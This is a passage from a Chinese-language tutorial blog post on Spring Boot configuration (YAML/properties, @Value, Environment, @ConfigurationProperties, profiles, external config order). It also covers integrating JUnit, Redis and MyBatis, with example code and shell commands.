&#x2F; yml"></a>yaml &#x2F; yml</h5><p>k-v 之间<strong>必须有空格</strong>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span> </span><br></pre></td></tr></table></figure><p>同一目录下优先级：<code>properties &gt; yml &gt; yaml</code></p><h3 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h3><p>YAML Ain’t Markup Language，数据序列化格式。</p><p>以数据为核心，比传统 xml 更加简洁。</p><p>YMAL 文件有 <code>.yml</code> 和 <code>.yaml</code>。</p><p>对比：</p><h5 id="properties-1"><a href="#properties-1" class="headerlink" title="properties"></a>properties</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="attr">server.address</span>=<span class="string">127.0.0.1</span></span><br></pre></td></tr></table></figure><h5 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">address:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><ul><li>YAML 大小写敏感</li><li>value 之前必须有 $\ge 1$ 个空格 </li><li>相同层级的元素需要左对齐</li><li># 表示注释</li></ul><p>YMAL 文档：<a href="https://www.runoob.com/w3cnote/yaml-intro.html">https://www.runoob.com/w3cnote/yaml-intro.html</a></p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>自定义配置文件，在程序里使用。</p><ul><li>@Value 注解</li><li>Environment</li><li>@ConfigrationProperties</li></ul><h5 id="Value-注解"><a href="#Value-注解" class="headerlink" title="@Value 注解"></a>@Value 注解</h5><ol><li>对象注入</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">fish</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hello2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Alice</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">18</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;person.name&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String PersonName;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value(&quot;$&#123;person.age&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> PersonAge;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hello3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello3</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> STR.<span class="string">&quot;\&#123;PersonName&#125; is \&#123;String.valueOf(PersonAge)&#125; years old.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>数组注入</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">array:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">2</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">-99</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;array[0]&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String num;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hello4&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello4</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> Environment environment;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hello5&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello5</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(environment);</span><br><span class="line">    System.out.println(environment.getProperty(<span class="string">&quot;array[2]&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h5><p>自定义一个 Java Bean，通过配置文件进行对象注入。</p><p><code>@Component</code> 代表告诉 springboot 自动检测这个自定义的 Bean。</p><p><code>@ConfigurationProperties</code> 用于指明绑定配置文件中定义的对象数据。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">person:</span><br><span class="line">  name: Alice</span><br><span class="line">  age: <span class="number">12</span></span><br><span class="line">  ip:</span><br><span class="line">    - <span class="number">127</span></span><br><span class="line">    - <span class="number">0</span></span><br><span class="line">    - <span class="number">0</span></span><br><span class="line">    - <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h3><p>开发 springboot 应用时，一套程序会被安装到不同环境，如：开发、测试、生产等。</p><p>其中数据库地址、服务器端口都是不容的。</p><p>profile 能够进行动态配置切换。</p><h5 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h5><ul><li>多 profile 文件方式</li></ul><p>创建多个文件，每个文件代表一个生产环境。</p><p>在主配置文件 application.yaml 中指定如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><p>其中 dev 是 applicayion-dev.yaml。</p><ul><li>yml 多文档方式</li></ul><p>只有一个文件，写所有的配置。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="attr">activate:</span></span><br><span class="line">      <span class="attr">on-profile:</span> <span class="string">dev</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="attr">activate:</span></span><br><span class="line">      <span class="attr">on-profile:</span> <span class="string">test</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="attr">activate:</span></span><br><span class="line">      <span class="attr">on-profile:</span> <span class="string">pro</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><h5 id="激活方式"><a href="#激活方式" class="headerlink" title="激活方式"></a>激活方式</h5><ul><li>配置文件</li></ul><p>如上。</p><p>可以在 IDEA 中配置参数。</p><ul><li>虚拟机参数（VM options）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dspring.profiles.active=dev</span><br></pre></td></tr></table></figure><ul><li>命令行参数（Program arguments）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Dspring.profiles.active=dev</span><br></pre></td></tr></table></figure><p>在部署时，也可以在命令行中设置参数，如下：</p><ol><li>使用 maven 打包项目</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>此时可以看到项目被打包到了 <code>./target/initializer-helloworld-0.0.1-SNAPSHOT.jar </code>。</p><ol start="2"><li>启动项目</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar initializer-helloworld-0.0.1-SNAPSHOT.jar --spring.profiles.active=dev</span><br></pre></td></tr></table></figure><h3 id="内部配置加载顺序"><a href="#内部配置加载顺序" class="headerlink" title="内部配置加载顺序"></a><code>内部配置</code>加载顺序</h3><p>没啥卵用。</p><h3 id="外部配置加载顺序"><a href="#外部配置加载顺序" class="headerlink" title="外部配置加载顺序"></a><code>外部配置</code>加载顺序</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/boot-features-external-config.html">https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/boot-features-external-config.html</a></p><h5 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h5><p>打包成 jar 包后，可以从外部配置参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/initializer-helloworld-0.0.1-SNAPSHOT.jar --server.port=9999</span><br></pre></td></tr></table></figure><p>但是往往参数会很多，这样子会很麻烦，可以把参数都写在一起。</p><h5 id="命令行指定外部配置文件"><a href="#命令行指定外部配置文件" class="headerlink" title="命令行指定外部配置文件"></a>命令行指定外部配置文件</h5><p>在 jar 包外部指定一个配置文件并通过命令行载入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/initializer-helloworld-0.0.1-SNAPSHOT.jar --spring.config.location=../XXX.yml</span><br></pre></td></tr></table></figure><p>载入后项目内部的 peroperties 或者 yaml 就失效了。</p><p>因为我只在外部指定 port，启动失败了，报错 <code>injection failed</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error starting ApplicationContext. To display the condition evaluation report re-run your application with <span class="string">&#x27;debug&#x27;</span> enabled.</span><br><span class="line">2024-05-23T20:35:46.414+08:00 ERROR 39361 --- [           main] o.s.boot.SpringApplication               : Application run failed</span><br><span class="line"></span><br><span class="line">org.springframework.beans.factory.BeanCreationException: Error creating bean with name <span class="string">&#x27;helloController&#x27;</span>: Injection of autowired dependencies failed</span><br></pre></td></tr></table></figure><p>疑问：为什么使用 -D 就没读取到呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/initializer-helloworld-0.0.1-SNAPSHOT.jar -Dspring.config.location=../XXX.yaml </span><br></pre></td></tr></table></figure><h5 id="target-目录中的-config-文件"><a href="#target-目录中的-config-文件" class="headerlink" title="target 目录中的 config 文件"></a>target 目录中的 config 文件</h5><p>在 jar 包同一级别的 target 目录下创建一个 <code>config</code> 文件，并在 config 文件中写 <code>application.yaml</code>，该文件的优先级比 <code>resources</code>  下的项目内部配置文件高。</p><p>作用：在打包 jar 包后，进行少量的修改在外部配置，不用对内部配置大动干戈。</p><h2 id="SpringBoot-整合其他框架"><a href="#SpringBoot-整合其他框架" class="headerlink" title="SpringBoot 整合其他框架"></a>SpringBoot 整合其他框架</h2><h3 id="整合-Junit-单元测试"><a href="#整合-Junit-单元测试" class="headerlink" title="整合 Junit 单元测试"></a>整合 Junit 单元测试</h3><p>实现步骤：</p><ul><li>搭建 springboot 工程</li><li>引入 <code>starter-test</code> 依赖</li><li>编写测试类</li><li>添加测试相关注解<ul><li>@RunWith (SpringRunner.class)</li><li>@SpringBoottest (classes &#x3D; 启动类.class)</li></ul></li><li>编写测试方法</li></ul><h5 id="假定测试某个-Service"><a href="#假定测试某个-Service" class="headerlink" title="假定测试某个  Service"></a>假定测试某个  Service</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;add...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="编写单元测试类"><a href="#编写单元测试类" class="headerlink" title="编写单元测试类"></a>编写单元测试类</h5><p>在  <code>src/test/java/com/fish</code> 下，创建 <code>UserServiceTest</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.InitializerHelloworldApplication;</span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.UserService;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.MethodOrderer;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Order;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.TestMethodOrder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * userService 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest(classes = InitializerHelloworldApplication.class)</span></span><br><span class="line"><span class="meta">@TestMethodOrder(MethodOrderer.OrderAnnotation.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userSevrice;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两个测试方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@Order(2)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAdd</span><span class="params">()</span> &#123;</span><br><span class="line">        userSevrice.add();</span><br><span class="line">        System.out.println(<span class="string">&quot;Test 1 boot&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@Order(1)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSub</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test 2 not impl yet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>@SpringBootTest<ul><li>指定测试的启动类</li></ul></li><li>@Test<ul><li>指定测试方法，每一个单元测试方法上都应加上它才会生效</li></ul></li><li>@Order<ul><li>指定测试的顺序</li></ul></li><li>@TestMethodOrder<ul><li>配合 @Order 一起使用</li></ul></li></ul><p>如果这个测试类在和主类同一级的 package 下，@SpringBootTest 不用显式指定类。</p><p>如：</p><ul><li>src - main - java - com -fish - HelloWorld</li><li>src - test - java - com - fish - HelloWorld</li></ul><p>那么，只需要写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br></pre></td></tr></table></figure><p>就可以了，不需要显式指定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(classes = InitializerHelloworldApplication.class)</span></span><br></pre></td></tr></table></figure><p>在非同级 package 下，如果不加，则会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">22:02:38.262 [main] INFO org.springframework.test.context.support.AnnotationConfigContextLoaderUtils -- Could not detect default configuration classes <span class="keyword">for</span> <span class="built_in">test</span> class [com.fish.UserServiceTest]: UserServiceTest does not <span class="built_in">declare</span> any static, non-private, non-final, nested classes annotated with @Configuration.</span><br><span class="line"></span><br><span class="line">Test ignored.</span><br><span class="line"></span><br><span class="line">Test ignored.</span><br><span class="line"></span><br><span class="line">java.lang.IllegalStateException: Unable to find a @SpringBootConfiguration, you need to use @ContextConfiguration or @SpringBootTest(classes=...) with your <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">at org.springframework.util.Assert.state(Assert.java:76)</span><br><span class="line">at org.springframework.boot.test.context.SpringBootTestContextBootstrapper.findConfigurationClass(SpringBootTestContextBootstrapper.java:246)</span><br></pre></td></tr></table></figure><h3 id="整合-redis"><a href="#整合-redis" class="headerlink" title="整合 redis"></a>整合 redis</h3><p>实现步骤：</p><ul><li>搭建 springboot 工程</li><li>引入 redis 起步依赖</li><li>配置 redis 相关属性</li><li>注入 redis template 模板</li><li>编写测试方法，进行测试</li></ul><blockquote><p>相比 Spring，不需要配置信息以及模板对象了，这些都由 springboot 默认提供好了。</p></blockquote><h5 id="安装-redis"><a href="#安装-redis" class="headerlink" title="安装 redis"></a>安装 redis</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S redis</span><br></pre></td></tr></table></figure><h5 id="启动-redis"><a href="#启动-redis" class="headerlink" title="启动 redis"></a>启动 redis</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start redis</span><br></pre></td></tr></table></figure><blockquote><p>关于启动 redis-cli get 得到的中文给的是硬编码，可以使用 <code>redis-cli --raw</code> 查看汉字。</p><p>如果嫌麻烦，可以写在 <code>.bashrc</code> 里面，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> redis-cli=<span class="string">&quot;redis-cli --raw&quot;</span></span><br></pre></td></tr></table></figure></blockquote><h5 id="引入依赖-1"><a href="#引入依赖-1" class="headerlink" title="引入依赖"></a>引入依赖</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.data<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="直接使用-RedisTemplate"><a href="#直接使用-RedisTemplate" class="headerlink" title="直接使用 RedisTemplate"></a>直接使用 RedisTemplate</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.InitializerHelloworldApplication;</span><br><span class="line"><span class="keyword">import</span> jakarta.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest(classes = InitializerHelloworldApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, String&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        redisTemplate.boundValueOps(<span class="string">&quot;name&quot;</span>).set(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 读取数据</span></span><br><span class="line">        System.out.println(redisTemplate.boundValueOps(<span class="string">&quot;name&quot;</span>).get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="整合-mybatis"><a href="#整合-mybatis" class="headerlink" title="整合 mybatis"></a>整合 mybatis</h3><p>实现步骤：</p><ul><li>搭建 springboot 工程</li><li>引入 mybatis 起步依赖，添加 mysql 驱动</li><li>编写 DataSource 和 mybatis 相关配置</li><li>定义表和实体类</li><li>编写 DAO 和 mapper 文件（纯注解开发）</li><li>测试</li></ul><h5 id="运行-docker-中的-mysql"><a href="#运行-docker-中的-mysql" class="headerlink" title="运行 docker 中的 mysql"></a>运行 docker 中的 mysql</h5><p>前提是已经装好了 mysql image。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 